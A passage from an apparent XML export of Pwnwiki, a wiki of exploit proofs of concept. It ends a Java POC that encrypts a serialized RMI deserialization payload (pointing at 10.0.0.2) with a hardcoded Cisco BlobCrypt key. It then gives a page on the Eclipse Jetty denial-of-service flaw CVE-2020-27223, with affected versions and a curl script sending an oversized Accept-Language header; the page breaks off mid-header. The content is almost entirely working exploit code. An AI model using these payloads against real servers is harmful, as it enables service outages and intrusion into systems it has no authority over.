      <timestamp>2021-04-27T07:00:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; import java.security.InvalidKeyException; import java.util.Base64; import com.cisco.nm.cmf.security.jaas.BlobCrypt;  public class JaasEncryptor {          public..."</comment>
      <origin>1902</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1070" sha1="f6e4gvhw1n56b017pgbzkya13ntr6nz" xml:space="preserve">==POC==
&lt;pre&gt;
import java.security.InvalidKeyException;
import java.util.Base64;
import com.cisco.nm.cmf.security.jaas.BlobCrypt;

public class JaasEncryptor {

        public static void main(String args[]) {
                String b64Payload = "rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVyAAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3MQAKVW5pY2FzdFJlZgAIMTAuMC4wLjIAAAG7AAAAAEBnvkQAAAAAAAAAAAAAAAAAAAB4";

                byte[] payload = Base64.getDecoder().decode(b64Payload);
                byte[] key = new byte[]{-100, 76, -23, 87, 125, 0, 5, 94, 12, 76, 37, -84, 36, 78, 123, 5};
                
                byte[] enc = BlobCrypt.encryptArray(payload, key);
                System.out.println("Encrypted payload: " + Base64.getEncoder().encodeToString(enc));
                byte[] dec = BlobCrypt.decryptArray(enc, key);
        }
}
&lt;/pre&gt;</text>
      <sha1>f6e4gvhw1n56b017pgbzkya13ntr6nz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-27223 Eclipse Jetty 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>2548</id>
    <revision>
      <id>3046</id>
      <timestamp>2021-05-22T02:40:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== &lt;pre&gt; Eclipse Jetty 9.4.6.v20170531 至9.4.36.v20210114版本 Eclipse Jetty 10.0.0版本 Eclipse Jetty 11.0.0版本 &lt;/pre&gt;  ==POC1== &lt;pre&gt; #!/bin/bash  time c..."</comment>
      <origin>3046</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="254408" sha1="2jzi6gimjjqm7htew8bi8jb4pqpm5ux" xml:space="preserve">==影響版本==
&lt;pre&gt;
Eclipse Jetty 9.4.6.v20170531 至9.4.36.v20210114版本
Eclipse Jetty 10.0.0版本
Eclipse Jetty 11.0.0版本
&lt;/pre&gt;

==POC1==
&lt;pre&gt;
#!/bin/bash

time curl -m 120 "http://127.0.0.1:8080/" -H 'Accept-Language: aaa;q=0.341, aab;q=0.484, aac;q=0.093'

time curl -m 120 "http://127.0.0.1:8080/" -H 'Accept-Language: aaa;q=0.341, aab;q=0.484, aac;q=0.093, aad;q=0.188, aae;q=0.173, aaf;q=0.748, aag;q=0.659, aah;q=0.411, aai;q=0.083, aaj;q=0.273, aak;q=0.771, aal;q=0.777, aam;q=0.583, aan;q=0.283, aao;q=0.756, aap;q=0.922, aaq;q=0.937, aar;q=0.124, aas;q=0.508, aat;q=0.958, aau;q=0.560, aav;q=0.132, aaw;q=0.558, aax;q=0.684, aay;q=0.037, aaz;q=0.009, aba;q=0.938, abb;q=0.800, abc;q=0.031, abd;q=0.383, abe;q=0.321, abf;q=0.197, abg;q=0.764, abh;q=0.478, abi;q=0.725, abj;q=0.339, abk;q=0.389, abl;q=0.245, abm;q=0.384, abn;q=0.051, abo;q=0.898, abp;q=0.976, abq;q=0.882, abr;q=0.568, abs;q=0.690, abt;q=0.046, abu;q=0.823, abv;q=0.959, abw;q=0.516, abx;q=0.606, aby;q=0.857, abz;q=0.291, aca;q=0.532, acb;q=0.794, acc;q=0.258, acd;q=0.963, ace;q=0.388, acf;q=0.610, acg;q=0.276, ach;q=0.726, aci;q=0.131, acj;q=0.107, ack;q=0.863, acl;q=0.095, acm;q=0.200, acn;q=0.001, aco;q=0.078, acp;q=0.850, acq;q=0.243, acr;q=0.515, acs;q=0.808, act;q=0.529, acu;q=0.784, acv;q=0.440, acw;q=0.880, acx;q=0.832, acy;q=0.578, acz;q=0.127, ada;q=0.388, adb;q=0.753, adc;q=0.126, add;q=0.813, ade;q=0.789, adf;q=0.619, adg;q=0.326, adh;q=0.807, adi;q=0.115, adj;q=0.647, adk;q=0.182, adl;q=0.878, adm;q=0.710, adn;q=0.537, ado;q=0.343, adp;q=0.943, adq;q=0.376, adr;q=0.992, ads;q=0.702, adt;q=0.789, adu;q=0.238, adv;q=0.436, adw;q=0.754, adx;q=0.386, ady;q=0.423, adz;q=0.084, aea;q=0.701, aeb;q=0.272, aec;q=0.496, aed;q=0.503, aee;q=0.907, aef;q=0.216, aeg;q=0.563, aeh;q=0.984, aei;q=0.696, aej;q=0.433, aek;q=0.893, ael;q=0.180, aem;q=0.809, aen;q=0.454, aeo;q=0.075, aep;q=0.036, aeq;q=0.969, aer;q=0.572, aes;q=0.608, aet;q=0.292, aeu;q=0.314, aev;q=0.011, aew;q=0.357, aex;q=0.037, aey;q=0.657, aez;q=0.951, afa;q=0.706, afb;q=0.357, afc;q=0.188, afd;q=0.423, afe;q=0.667, aff;q=0.862, afg;q=0.184, afh;q=0.961, afi;q=0.928, afj;q=0.517, afk;q=0.439, afl;q=0.346, afm;q=0.878, afn;q=0.834, afo;q=0.603, afp;q=0.869, afq;q=0.067, afr;q=0.542, afs;q=0.963, aft;q=0.494, afu;q=0.008, afv;q=0.022, afw;q=0.976, afx;q=0.812, afy;q=0.249, afz;q=0.701, aga;q=0.847, agb;q=0.194, agc;q=0.536, agd;q=0.003, age;q=0.528, agf;q=0.513, agg;q=0.837, agh;q=0.266, agi;q=0.424, agj;q=0.044, agk;q=0.051, agl;q=0.180, agm;q=0.320, agn;q=0.904, ago;q=0.627, agp;q=0.471, agq;q=0.914, agr;q=0.420, ags;q=0.296, agt;q=0.331, agu;q=0.914, agv;q=0.335, agw;q=0.712, agx;q=0.890, agy;q=0.791, agz;q=0.849, aha;q=0.629, ahb;q=0.406, ahc;q=0.905, ahd;q=0.824, ahe;q=0.501, ahf;q=0.936, ahg;q=0.908, ahh;q=0.137, ahi;q=0.618, ahj;q=0.887, ahk;q=0.013, ahl;q=0.316, ahm;q=0.540, ahn;q=0.999, aho;q=0.996, ahp;q=0.654, ahq;q=0.372, ahr;q=0.007, ahs;q=0.311, aht;q=0.694, ahu;q=0.047, ahv;q=0.852, ahw;q=0.825, ahx;q=0.515, ahy;q=0.752, ahz;q=0.246, aia;q=0.794, aib;q=0.723, aic;q=0.659, aid;q=0.132, aie;q=0.965, aif;q=0.249, aig;q=0.451, aih;q=0.785, aii;q=0.271, aij;q=0.595, aik;q=0.547, ail;q=0.306, aim;q=0.676, ain;q=0.791, aio;q=0.764, aip;q=0.754, aiq;q=0.598, air;q=0.939, ais;q=0.475, ait;q=0.705, aiu;q=0.972, aiv;q=0.960, aiw;q=0.205, aix;q=0.970, aiy;q=0.457, aiz;q=0.861, aja;q=0.461, ajb;q=0.542, ajc;q=0.831, ajd;q=0.223, aje;q=0.942, ajf;q=0.695, ajg;q=0.542, ajh;q=0.083, aji;q=0.230, ajj;q=0.821, ajk;q=0.278, ajl;q=0.411, ajm;q=0.872, ajn;q=0.697, ajo;q=0.115, ajp;q=0.425, ajq;q=0.166, ajr;q=0.602, ajs;q=0.927, ajt;q=0.933, aju;q=0.835, ajv;q=0.594, ajw;q=0.583, ajx;q=0.376, ajy;q=0.736, ajz;q=0.126, aka;q=0.160, akb;q=0.610, akc;q=0.032, akd;q=0.443, ake;q=0.417, akf;q=0.649, akg;q=0.667, akh;q=0.882, aki;q=0.876, akj;q=0.404, akk;q=0.834, akl;q=0.977, akm;q=0.183, akn;q=0.879, ako;q=0.958, akp;q=0.815, akq;q=0.661, akr;q=0.161, aks;q=0.551, akt;q=0.778, aku;q=0.667, akv;q=0.969, akw;q=0.431, akx;q=0.625, aky;q=0.815, akz;q=0.495, ala;q=0.754, alb;q=0.023, alc;q=0.475, ald;q=0.002, ale;q=0.958, alf;q=0.433, alg;q=0.043, alh;q=0.516, ali;q=0.661, alj;q=0.917, alk;q=0.088, all;q=0.246, alm;q=0.634, aln;q=0.879, alo;q=0.164, alp;q=0.651, alq;q=0.744, alr;q=0.685, als;q=0.580, alt;q=0.595, alu;q=0.347, alv;q=0.759, alw;q=0.906, alx;q=0.998, aly;q=0.985, alz;q=0.502, ama;q=0.806, amb;q=0.547, amc;q=0.704, amd;q=0.910, ame;q=0.159, amf;q=0.826, amg;q=0.761, amh;q=0.205, ami;q=0.090, amj;q=0.368, amk;q=0.693, aml;q=0.038, amm;q=0.503, amn;q=0.094, amo;q=0.471, amp;q=0.217, amq;q=0.539, amr;q=0.765, ams;q=0.597, amt;q=0.785, amu;q=0.880, amv;q=0.448, amw;q=0.672, amx;q=0.719, amy;q=0.742, amz;q=0.175, ana;q=0.881, anb;q=0.810, anc;q=0.056, and;q=0.101, ane;q=0.324, anf;q=0.199, ang;q=0.096, anh;q=0.847, ani;q=0.475, anj;q=0.785, ank;q=0.862, anl;q=0.881, anm;q=0.039, ann;q=0.453, ano;q=0.624, anp;q=0.804, anq;q=0.995, anr;q=0.274, ans;q=0.137, ant;q=0.729, anu;q=0.278, anv;q=0.027, anw;q=0.375, anx;q=0.876, any;q=0.672, anz;q=0.185, aoa;q=0.378, aob;q=0.407, aoc;q=0.747, aod;q=0.380, aoe;q=0.203, aof;q=0.517, aog;q=0.309, aoh;q=0.253, aoi;q=0.077, aoj;q=0.758, aok;q=0.214, aol;q=0.212, aom;q=0.947, aon;q=0.011, aoo;q=0.840, aop;q=0.847, aoq;q=0.262, aor;q=0.505, aos;q=0.187, aot;q=0.017, aou;q=0.692, aov;q=0.163, aow;q=0.323, aox;q=0.018, aoy;q=0.247, aoz;q=0.280, apa;q=0.309, apb;q=0.913, apc;q=0.199, apd;q=0.205, ape;q=0.044, apf;q=0.490, apg;q=0.566, aph;q=0.145, api;q=0.600, apj;q=0.976, apk;q=0.773, apl;q=0.270, apm;q=0.873, apn;q=0.375, apo;q=0.564, app;q=0.261, apq;q=0.327, apr;q=0.494, aps;q=0.177, apt;q=0.021, apu;q=0.434, apv;q=0.438, apw;q=0.439, apx;q=0.006, apy;q=0.082, apz;q=0.540, aqa;q=0.183, aqb;q=0.407, aqc;q=0.976, aqd;q=0.454, aqe;q=0.564, aqf;q=0.262, aqg;q=0.259, aqh;q=0.999, aqi;q=0.418, aqj;q=0.174, aqk;q=0.220, aql;q=0.970, aqm;q=0.242, aqn;q=0.612, aqo;q=0.622, aqp;q=0.634, aqq;q=0.716, aqr;q=0.218, aqs;q=0.257, aqt;q=0.616, aqu;q=0.641, aqv;q=0.077, aqw;q=0.436, aqx;q=0.823, aqy;q=0.099, aqz;q=0.912, ara;q=0.394, arb;q=0.524, arc;q=0.858, ard;q=0.683, are;q=0.975, arf;q=0.323, arg;q=0.591, arh;q=0.409, ari;q=0.250, arj;q=0.102, ark;q=0.253, arl;q=0.608, arm;q=0.294, arn;q=0.943, aro;q=0.570, arp;q=0.047, arq;q=0.055, arr;q=0.538, ars;q=0.051, art;q=0.716, aru;q=0.608, arv;q=0.288, arw;q=0.207, arx;q=0.052, ary;q=0.132, arz;q=0.500, asa;q=0.053, asb;q=0.801, asc;q=0.369, asd;q=0.373, ase;q=0.168, asf;q=0.986, asg;q=0.692, ash;q=0.698, asi;q=0.578, asj;q=0.051, ask;q=0.828, asl;q=0.341, asm;q=0.551, asn;q=0.417, aso;q=0.945, asp;q=0.655, asq;q=0.869, asr;q=0.865, ass;q=0.468, ast;q=0.621, asu;q=0.908, asv;q=0.183, asw;q=0.942, asx;q=0.605, asy;q=0.496, asz;q=0.873, ata;q=0.333, atb;q=0.343, atc;q=0.563, atd;q=0.081, ate;q=0.519, atf;q=0.156, atg;q=0.031, ath;q=0.637, ati;q=0.861, atj;q=0.533, atk;q=0.099, atl;q=0.692, atm;q=0.280, atn;q=0.776, ato;q=0.312, atp;q=0.963, atq;q=0.470, atr;q=0.880, ats;q=0.086, att;q=0.897, atu;q=0.974, atv;q=0.592, atw;q=0.554, atx;q=0.845, aty;q=0.307, atz;q=0.397, aua;q=0.109, aub;q=0.244, auc;q=0.409, aud;q=0.304, aue;q=0.734, auf;q=0.641, aug;q=0.472, auh;q=0.580, aui;q=0.332, auj;q=0.359, auk;q=0.856, aul;q=0.930, aum;q=0.855, aun;q=0.081, auo;q=0.458, aup;q=0.271, auq;q=0.726, aur;q=0.588, aus;q=0.514, aut;q=0.693, auu;q=0.239, auv;q=0.481, auw;q=0.564, aux;q=0.155, auy;q=0.931, auz;q=0.761, ava;q=0.994, avb;q=0.096, avc;q=0.958, avd;q=0.342, ave;q=0.927, avf;q=0.928, avg;q=0.481, avh;q=0.971, avi;q=0.309, avj;q=0.746, avk;q=0.583, avl;q=0.096, avm;q=0.889, avn;q=0.200, avo;q=0.428, avp;q=0.955, avq;q=0.386, avr;q=0.327, avs;q=0.739, avt;q=0.534, avu;q=0.105, avv;q=0.552, avw;q=0.154, avx;q=0.402, avy;q=0.731, avz;q=0.530, awa;q=0.710, awb;q=0.497, awc;q=0.743, awd;q=0.695, awe;q=0.887, awf;q=0.676, awg;q=0.662, awh;q=0.552, awi;q=0.122, awj;q=0.847, awk;q=0.662, awl;q=0.896, awm;q=0.356, awn;q=0.488, awo;q=0.863, awp;q=0.445, awq;q=0.581, awr;q=0.508, aws;q=0.683, awt;q=0.001, awu;q=0.861, awv;q=0.129, aww;q=0.885, awx;q=0.064, awy;q=0.802, awz;q=0.836, axa;q=0.780, axb;q=0.507, axc;q=0.790, axd;q=0.576, axe;q=0.817, axf;q=0.096, axg;q=0.650, axh;q=0.479, axi;q=0.554, axj;q=0.250, axk;q=0.821, axl;q=0.096, axm;q=0.011, axn;q=0.038, axo;q=0.651, axp;q=0.541, axq;q=0.121, axr;q=0.468, axs;q=0.563, axt;q=0.930, axu;q=0.838, axv;q=0.835, axw;q=0.975, axx;q=0.263, axy;q=0.186, axz;q=0.470, aya;q=0.610, ayb;q=0.016, ayc;q=0.979, ayd;q=0.852, aye;q=0.094, ayf;q=0.135, ayg;q=0.908, ayh;q=0.211, ayi;q=0.030, ayj;q=0.831, ayk;q=0.958, ayl;q=0.534, aym;q=0.479, ayn;q=0.544, ayo;q=0.334, ayp;q=0.318, ayq;q=0.894, ayr;q=0.557, ays;q=0.075, ayt;q=0.332, ayu;q=0.095, ayv;q=0.455, ayw;q=0.470, ayx;q=0.985, ayy;q=0.240, ayz;q=0.203, aza;q=0.857, azb;q=0.921, azc;q=0.914, azd;q=0.137, aze;q=0.964, azf;q=0.589, azg;q=0.242, azh;q=0.709, azi;q=0.385, azj;q=0.577, azk;q=0.328, azl;q=0.942, azm;q=0.516, azn;q=0.994, azo;q=0.126, azp;q=0.600, azq;q=0.774, azr;q=0.574, azs;q=0.966, azt;q=0.321, azu;q=0.641, azv;q=0.520, azw;q=0.315, azx;q=0.437, azy;q=0.368, azz;q=0.650, baa;q=0.935, bab;q=0.631, bac;q=0.937, bad;q=0.352, bae;q=0.271, baf;q=0.092, bag;q=0.649, bah;q=0.127, bai;q=0.898, baj;q=0.856, bak;q=0.935, bal;q=0.179, bam;q=0.448, ban;q=0.074, bao;q=0.192, bap;q=0.444, baq;q=0.106, bar;q=0.119, bas;q=0.199, bat;q=0.636, bau;q=0.688, bav;q=0.224, baw;q=0.166, bax;q=0.253, bay;q=0.788, baz;q=0.544, bba;q=0.412, bbb;q=0.465, bbc;q=0.362, bbd;q=0.402, bbe;q=0.163, bbf;q=0.295, bbg;q=0.587, bbh;q=0.594, bbi;q=0.575, bbj;q=0.634, bbk;q=0.504, bbl;q=0.750, bbm;q=0.396, bbn;q=0.076, bbo;q=0.540, bbp;q=0.498, bbq;q=0.570, bbr;q=0.957, bbs;q=0.341, bbt;q=0.089, bbu;q=0.841, bbv;q=0.222, bbw;q=0.980, bbx;q=0.673, bby;q=0.218, bbz;q=0.346, bca;q=0.588, bcb;q=0.275, bcc;q=0.395, bcd;q=0.708, bce;q=0.442, bcf;q=0.341, bcg;q=0.273, bch;q=0.222, bci;q=0.158, bcj;q=0.881, bck;q=0.069, bcl;q=0.142, bcm;q=0.006, bcn;q=0.998, bco;q=0.501, bcp;q=0.239, bcq;q=0.223, bcr;q=0.022, bcs;q=0.856, bct;q=0.210, bcu;q=0.743, bcv;q=0.168, bcw;q=0.726, bcx;q=0.322, bcy;q=0.664, bcz;q=0.199, bda;q=0.231, bdb;q=0.966, bdc;q=0.320, bdd;q=0.060, bde;q=0.384, bdf;q=0.748, bdg;q=0.643, bdh;q=0.480, bdi;q=0.211, bdj;q=0.859, bdk;q=0.431, bdl;q=0.094, bdm;q=0.803, bdn;q=0.951, bdo;q=0.674, bdp;q=0.200, bdq;q=0.776, bdr;q=0.776, bds;q=0.383, bdt;q=0.451, bdu;q=0.350, bdv;q=0.204, bdw;q=0.750, bdx;q=0.957, bdy;q=0.918, bdz;q=0.172, bea;q=0.825, beb;q=0.331, bec;q=0.932, bed;q=0.858, bee;q=0.887, bef;q=0.134, beg;q=0.697, beh;q=0.272, bei;q=0.281, bej;q=0.159, bek;q=0.319, bel;q=0.966, bem;q=0.807, ben;q=0.213, beo;q=0.090, bep;q=0.343, beq;q=0.704, ber;q=0.812, bes;q=0.145, bet;q=0.510, beu;q=0.131, bev;q=0.455, bew;q=0.968, bex;q=0.359, bey;q=0.369, bez;q=0.484, bfa;q=0.539, bfb;q=0.541, bfc;q=0.962, bfd;q=0.492, bfe;q=0.671, bff;q=0.579, bfg;q=0.696, bfh;q=0.198, bfi;q=0.081, bfj;q=0.310, bfk;q=0.891, bfl;q=0.352, bfm;q=0.291, bfn;q=0.614, bfo;q=0.536, bfp;q=0.572, bfq;q=0.278, bfr;q=0.144, bfs;q=0.233, bft;q=0.147, bfu;q=0.104, bfv;q=0.683, bfw;q=0.003, bfx;q=0.944, bfy;q=0.580, bfz;q=0.080, bga;q=0.408, bgb;q=0.162, bgc;q=0.464, bgd;q=0.929, bge;q=0.329, bgf;q=0.947, bgg;q=0.642, bgh;q=0.698, bgi;q=0.836, bgj;q=0.086, bgk;q=0.712, bgl;q=0.515, bgm;q=0.026, bgn;q=0.186, bgo;q=0.299, bgp;q=0.613, bgq;q=0.441, bgr;q=0.741, bgs;q=0.533, bgt;q=0.830, bgu;q=0.163, bgv;q=0.818, bgw;q=0.819, bgx;q=0.607, bgy;q=0.021, bgz;q=0.014, bha;q=0.461, bhb;q=0.392, bhc;q=0.681, bhd;q=0.933, bhe;q=0.210, bhf;q=0.539, bhg;q=0.473, bhh;q=0.109, bhi;q=0.220, bhj;q=0.428, bhk;q=0.262, bhl;q=0.879, bhm;q=0.383, bhn;q=0.866, bho;q=0.698, bhp;q=0.590, bhq;q=0.827, bhr;q=0.231, bhs;q=0.283, bht;q=0.019, bhu;q=0.702, bhv;q=0.692, bhw;q=0.787, bhx;q=0.882, bhy;q=0.889, bhz;q=0.690, bia;q=0.509, bib;q=0.117, bic;q=0.319, bid;q=0.017, bie;q=0.463, bif;q=0.458, big;q=0.614, bih;q=0.450, bii;q=0.966, bij;q=0.601, bik;q=0.722, bil;q=0.281, bim;q=0.034, bin;q=0.703, bio;q=0.899, bip;q=0.284, biq;q=0.948, bir;q=0.891, bis;q=0.269, bit;q=0.673, biu;q=0.515, biv;q=0.634, biw;q=0.330, bix;q=0.012, biy;q=0.324, biz;q=0.098, bja;q=0.498, bjb;q=0.228, bjc;q=0.712, bjd;q=0.249, bje;q=0.051, bjf;q=0.406, bjg;q=0.539, bjh;q=0.496, bji;q=0.330, bjj;q=0.329, bjk;q=0.479, bjl;q=0.168, bjm;q=0.145, bjn;q=0.434, bjo;q=0.004, bjp;q=0.891, bjq;q=0.890, bjr;q=0.863, bjs;q=0.347, bjt;q=0.600, bju;q=0.339, bjv;q=0.398, bjw;q=0.552, bjx;q=0.163, bjy;q=0.419, bjz;q=0.198, bka;q=0.095, bkb;q=0.962, bkc;q=0.540, bkd;q=0.279, bke;q=0.685, bkf;q=0.921, bkg;q=0.126, bkh;q=0.457, bki;q=0.174, bkj;q=0.581, bkk;q=0.611, bkl;q=0.858, bkm;q=0.466, bkn;q=0.443, bko;q=0.508, bkp;q=0.508, bkq;q=0.346, bkr;q=0.762, bks;q=0.080, bkt;q=0.072, bku;q=0.143, bkv;q=0.030, bkw;q=0.831, bkx;q=0.260, bky;q=0.808, bkz;q=0.789, bla;q=0.299, blb;q=0.719, blc;q=0.485, bld;q=0.797, ble;q=0.752, blf;q=0.118, blg;q=0.691, blh;q=0.081, bli;q=0.857, blj;q=0.182, blk;q=0.640, bll;q=0.638, blm;q=0.408, bln;q=0.971, blo;q=0.309, blp;q=0.074, blq;q=0.428, blr;q=0.225, bls;q=0.932, blt;q=0.512, blu;q=0.614, blv;q=0.175, blw;q=0.348, blx;q=0.798, bly;q=0.936, blz;q=0.636, bma;q=0.460, bmb;q=0.181, bmc;q=0.655, bmd;q=0.844, bme;q=0.216, bmf;q=0.600, bmg;q=0.889, bmh;q=0.260, bmi;q=0.557, bmj;q=0.990, bmk;q=0.993, bml;q=0.605, bmm;q=0.883, bmn;q=0.899, bmo;q=0.341, bmp;q=0.892, bmq;q=0.733, bmr;q=0.327, bms;q=0.195, bmt;q=0.350, bmu;q=0.803, bmv;q=0.817, bmw;q=0.154, bmx;q=0.882, bmy;q=0.122, bmz;q=0.729, bna;q=0.376, bnb;q=0.396, bnc;q=0.260, bnd;q=0.554, bne;q=0.419, bnf;q=0.043, bng;q=0.862, bnh;q=0.530, bni;q=0.204, bnj;q=0.994, bnk;q=0.991, bnl;q=0.249, bnm;q=0.423, bnn;q=0.306, bno;q=0.578, bnp;q=0.247, bnq;q=0.681, bnr;q=0.260, bns;q=0.499, bnt;q=0.345, bnu;q=0.992, bnv;q=0.404, bnw;q=0.353, bnx;q=0.368, bny;q=0.790, bnz;q=0.647, boa;q=0.823, bob;q=0.808, boc;q=0.391, bod;q=0.481, boe;q=0.710, bof;q=0.466, bog;q=0.758, boh;q=0.069, boi;q=0.949, boj;q=0.574, bok;q=0.181, bol;q=0.238, bom;q=0.050, bon;q=0.862, boo;q=0.744, bop;q=0.749, boq;q=0.244, bor;q=0.354, bos;q=0.449, bot;q=0.608, bou;q=0.393, bov;q=0.896, bow;q=0.685, box;q=0.515, boy;q=0.792, boz;q=0.178, bpa;q=0.688, bpb;q=0.839, bpc;q=0.229, bpd;q=0.639, bpe;q=0.332, bpf;q=0.425, bpg;q=0.387, bph;q=0.331, bpi;q=0.792, bpj;q=0.152, bpk;q=0.323, bpl;q=0.334, bpm;q=0.535, bpn;q=0.301, bpo;q=0.918, bpp;q=0.461, bpq;q=0.406, bpr;q=0.369, bps;q=0.689, bpt;q=0.115, bpu;q=0.100, bpv;q=0.781, bpw;q=0.210, bpx;q=0.571, bpy;q=0.987, bpz;q=0.546, bqa;q=0.469, bqb;q=0.097, bqc;q=0.520, bqd;q=0.757, bqe;q=0.015, bqf;q=0.406, bqg;q=0.296, bqh;q=0.318, bqi;q=0.613, bqj;q=0.782, bqk;q=0.033, bql;q=0.310, bqm;q=0.650, bqn;q=0.300, bqo;q=0.526, bqp;q=0.384, bqq;q=0.418, bqr;q=0.178, bqs;q=0.887, bqt;q=0.964, bqu;q=0.032, bqv;q=0.872, bqw;q=0.211, bqx;q=0.921, bqy;q=0.816, bqz;q=0.820, bra;q=0.555, brb;q=0.300, brc;q=0.831, brd;q=0.089, bre;q=0.646, brf;q=0.187, brg;q=0.261, brh;q=0.214, bri;q=0.520, brj;q=0.161, brk;q=0.795, brl;q=0.089, brm;q=0.461, brn;q=0.164, bro;q=0.859, brp;q=0.862, brq;q=0.368, brr;q=0.915, brs;q=0.298, brt;q=0.284, bru;q=0.869, brv;q=0.554, brw;q=0.632, brx;q=0.140, bry;q=0.607, brz;q=0.742, bsa;q=0.862, bsb;q=0.704, bsc;q=0.878, bsd;q=0.157, bse;q=0.509, bsf;q=0.860, bsg;q=0.229, bsh;q=0.493, bsi;q=0.075, bsj;q=0.825, bsk;q=0.081, bsl;q=0.748, bsm;q=0.928, bsn;q=0.668, bso;q=0.945, bsp;q=0.893, bsq;q=0.592, bsr;q=0.468, bss;q=0.174, bst;q=0.409, bsu;q=0.911, bsv;q=0.035, bsw;q=0.497, bsx;q=0.153, bsy;q=0.595, bsz;q=0.162, bta;q=0.380, btb;q=0.784, btc;q=0.410, btd;q=0.882, bte;q=0.134, btf;q=0.195, btg;q=0.393, bth;q=0.820, bti;q=0.301, btj;q=0.928, btk;q=0.881, btl;q=0.345, btm;q=0.487, btn;q=0.419, bto;q=0.997, btp;q=0.699, btq;q=0.295, btr;q=0.513, bts;q=0.865, btt;q=0.488, btu;q=0.698, btv;q=0.641, btw;q=0.570, btx;q=0.814, bty;q=0.098, btz;q=0.091, bua;q=0.448, bub;q=0.893, buc;q=0.913, bud;q=0.786, bue;q=0.674, buf;q=0.335, bug;q=0.000, buh;q=0.530, bui;q=0.432, buj;q=0.077, buk;q=0.469, bul;q=0.358, bum;q=0.440, bun;q=0.534, buo;q=0.854, bup;q=0.471, buq;q=0.399, bur;q=0.183, bus;q=0.644, but;q=0.065, buu;q=0.955, buv;q=0.393, buw;q=0.596, bux;q=0.401, buy;q=0.432, buz;q=0.737, bva;q=0.810, bvb;q=0.672, bvc;q=0.540, bvd;q=0.095, bve;q=0.215, bvf;q=0.056, bvg;q=0.912, bvh;q=0.877, bvi;q=0.948, bvj;q=0.737, bvk;q=0.330, bvl;q=0.444, bvm;q=0.821, bvn;q=0.359, bvo;q=0.205, bvp;q=0.399, bvq;q=0.679, bvr;q=0.259, bvs;q=0.273, bvt;q=0.005, bvu;q=0.933, bvv;q=0.988, bvw;q=0.637, bvx;q=0.947, bvy;q=0.668, bvz;q=0.721, bwa;q=0.793, bwb;q=0.098, bwc;q=0.047, bwd;q=0.151, bwe;q=0.602, bwf;q=0.889, bwg;q=0.313, bwh;q=0.996, bwi;q=0.963, bwj;q=0.611, bwk;q=0.536, bwl;q=0.580, bwm;q=0.855, bwn;q=0.481, bwo;q=0.885, bwp;q=0.163, bwq;q=0.092, bwr;q=0.727, bws;q=0.530, bwt;q=0.771, bwu;q=0.427, bwv;q=0.540, bww;q=0.322, bwx;q=0.051, bwy;q=0.509, bwz;q=0.487, bxa;q=0.869, bxb;q=0.735, bxc;q=0.215, bxd;q=0.725, bxe;q=0.655, bxf;q=0.393, bxg;q=0.212, bxh;q=0.807, bxi;q=0.359, bxj;q=0.677, bxk;q=0.497, bxl;q=0.433, bxm;q=0.659, bxn;q=0.251, bxo;q=0.919, bxp;q=0.439, bxq;q=0.008, bxr;q=0.608, bxs;q=0.891, bxt;q=0.632, bxu;q=0.874, bxv;q=0.489, bxw;q=0.038, bxx;q=0.148, bxy;q=0.561, bxz;q=0.877, bya;q=0.283, byb;q=0.825, byc;q=0.772, byd;q=0.255, bye;q=0.871, byf;q=0.285, byg;q=0.596, byh;q=0.633, byi;q=0.548, byj;q=0.506, byk;q=0.221, byl;q=0.720, bym;q=0.089, byn;q=0.503, byo;q=0.118, byp;q=0.903, byq;q=0.463, byr;q=0.819, bys;q=0.535, byt;q=0.257, byu;q=0.452, byv;q=0.268, byw;q=0.149, byx;q=0.829, byy;q=0.212, byz;q=0.367, bza;q=0.965, bzb;q=0.046, bzc;q=0.360, bzd;q=0.103, bze;q=0.396, bzf;q=0.244, bzg;q=0.430, bzh;q=0.727, bzi;q=0.676, bzj;q=0.756, bzk;q=0.062, bzl;q=0.931, bzm;q=0.650, bzn;q=0.967, bzo;q=0.590, bzp;q=0.299, bzq;q=0.415, bzr;q=0.144, bzs;q=0.419, bzt;q=0.197, bzu;q=0.887, bzv;q=0.491, bzw;q=0.973, bzx;q=0.256, bzy;q=0.781, bzz;q=0.339, caa;q=0.701, cab;q=0.721, cac;q=0.420, cad;q=0.623, cae;q=0.720, caf;q=0.921, cag;q=0.545, cah;q=0.901, cai;q=0.565, caj;q=0.791, cak;q=0.351, cal;q=0.958, cam;q=0.021, can;q=0.600, cao;q=0.679, cap;q=0.947, caq;q=0.325, car;q=0.552, cas;q=0.181, cat;q=0.791, cau;q=0.023, cav;q=0.218, caw;q=0.820, cax;q=0.413, cay;q=0.239, caz;q=0.291, cba;q=0.741, cbb;q=0.421, cbc;q=0.972, cbd;q=0.462, cbe;q=0.836, cbf;q=0.121, cbg;q=0.042, cbh;q=0.021, cbi;q=0.690, cbj;q=0.001, cbk;q=0.287, cbl;q=0.548, cbm;q=0.094, cbn;q=0.479, cbo;q=0.101, cbp;q=0.918, cbq;q=0.870, cbr;q=0.876, cbs;q=0.843, cbt;q=0.022, cbu;q=0.508, cbv;q=0.568, cbw;q=0.041, cbx;q=0.102, cby;q=0.170, cbz;q=0.210, cca;q=0.296, ccb;q=0.350, ccc;q=0.957, ccd;q=0.369, cce;q=0.682, ccf;q=0.982, ccg;q=0.987, cch;q=0.732, cci;q=0.184, ccj;q=0.509, cck;q=0.079, ccl;q=0.563, ccm;q=0.611, ccn;q=0.762, cco;q=0.705, ccp;q=0.762, ccq;q=0.920, ccr;q=0.083, ccs;q=0.472, cct;q=0.411, ccu;q=0.319, ccv;q=0.549, ccw;q=0.770, ccx;q=0.074, ccy;q=0.567, ccz;q=0.155, cda;q=0.778, cdb;q=0.015, 